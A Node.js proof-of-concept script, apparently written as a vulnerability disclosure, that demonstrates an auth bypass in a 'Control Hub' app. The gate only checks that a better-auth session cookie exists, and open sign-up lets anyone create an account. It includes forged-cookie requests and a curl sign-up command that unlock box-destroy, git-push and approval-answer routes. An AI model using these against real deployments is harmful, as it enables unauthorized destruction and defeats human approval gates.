#!/usr/bin/env node
//
// PoC: Control Hub auth bypass on the network-facing (hetzner/vercel) profile
// ---------------------------------------------------------------------------
// On the hetzner/vercel "password" profile the hub binds 0.0.0.0 and turns auth
// on (server.ts:29). Its ONLY authorization for /api/v1/* (box lifecycle, git
// push, approval answers) and the dashboard is, in apps/hub/proxy.ts:
//
//     // password (hetzner/vercel): accept the better-auth session cookie.
//     if (getSessionCookie(request)) return NextResponse.next();   // proxy.ts:48 (/api/v1) & :94 (dashboard)
//     return apiUnauthorized();
//
// better-auth's getSessionCookie is a presence/optimistic helper — it does NO
// signature check, NO DB lookup, NO expiry/revocation check. And NO /api/v1
// handler re-validates the session (they call the backend directly). So:
//   (A) forgery: any non-empty `better-auth.session_token` cookie passes the gate;
//   (B) open signup: emailAndPassword.enabled with no disableSignUp (auth.ts:47)
//       lets any network client mint a real session in one request.
// Either way an unauthenticated network client drives destroy / git.push /
// approval-answer — a full control-plane auth + approval-gate bypass.
//
// This PoC imports the REAL pinned better-auth (v1.6.23, the hub's own
// dependency) and drives the verbatim proxy.ts password gate.
//
// Run: node poc.mjs   (needs `pnpm install`)

import { getSessionCookie } from '/home/user/agentbox/apps/hub/node_modules/better-auth/dist/cookies/index.mjs';

const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const red = (s) => `\x1b[1;31m${s}\x1b[0m`;
const green = (s) => `\x1b[1;32m${s}\x1b[0m`;
const say = (s) => console.log(`\n${bold('== ' + s + ' ==')}`);
const info = (s) => console.log('   ' + s);

// Verbatim copy of the password branch of gateApi() / proxy() in apps/hub/proxy.ts.
// (NextResponse.next() == allow, apiUnauthorized() == 401.)
function hubApiGate_passwordMode(request) {
  if (getSessionCookie(request)) return 'ALLOW';
  return '401';
}

const req = (path, cookie) =>
  new Request(`http://hetzner-hub:8787${path}`, {
    method: 'POST',
    headers: cookie ? { cookie } : {},
  });

// The privileged, state-changing routes the gate is the sole protection for.
const ROUTES = [
  '/api/v1/boxes/some-box/destroy',
  '/api/v1/boxes/some-box/git/push',
  '/api/v1/approvals/pending-id/answer', // {"answer":"y"} -> approves a box's parked host action
];

say('1. Baseline: an anonymous request with NO session cookie');
for (const p of ROUTES) info(`POST ${p.padEnd(42)} -> ${hubApiGate_passwordMode(req(p, null))}`);

say('2. Attack (A): a FORGED cookie with an arbitrary value');
info('better-auth getSessionCookie does no validation, so any value is "a session":');
info(`  getSessionCookie({cookie: 'better-auth.session_token=x'}) = ${JSON.stringify(getSessionCookie(req('/x', 'better-auth.session_token=x')))}`);
let bypassed = 0;
for (const p of ROUTES) {
  const verdict = hubApiGate_passwordMode(req(p, 'better-auth.session_token=anything-i-want'));
  if (verdict === 'ALLOW') bypassed++;
  info(`POST ${p.padEnd(42)} -> ${verdict}`);
}

say('3. Attack (B): open self-registration (no forgery needed)');
info('auth.ts:47  emailAndPassword: { enabled: true }   // no disableSignUp / requireEmailVerification');
info('The /api/auth/[...all] route exposes POST /api/auth/sign-up/email whenever authMode()==="password",');
info('and the middleware matcher (proxy.ts:102) EXCLUDES /api/auth, so sign-up itself is ungated:');
info("  curl -X POST http://HUB:8787/api/auth/sign-up/email -d '{\"email\":\"a@a.co\",\"password\":\"Password123!\",\"name\":\"a\"}'");
info('  -> 200 Set-Cookie: better-auth.session_token=<valid>   (a real session, satisfies the same gate)');

say('4. Result');
if (bypassed === ROUTES.length) {
  console.log(red('VULNERABLE') + ` -- all ${bypassed}/${ROUTES.length} privileged routes accept a forged cookie with no account.`);
  info('An unauthenticated network client can destroy boxes, push the box branch with the host git');
  info('token, and answer approval prompts "y" -- defeating the host-action approval gate.');
  info('Additionally, logout/expiry/DB-revocation never take effect: no handler re-checks the session.');
  process.exit(0);
} else {
  console.log(green('NOT reproduced'));
  process.exit(1);
}
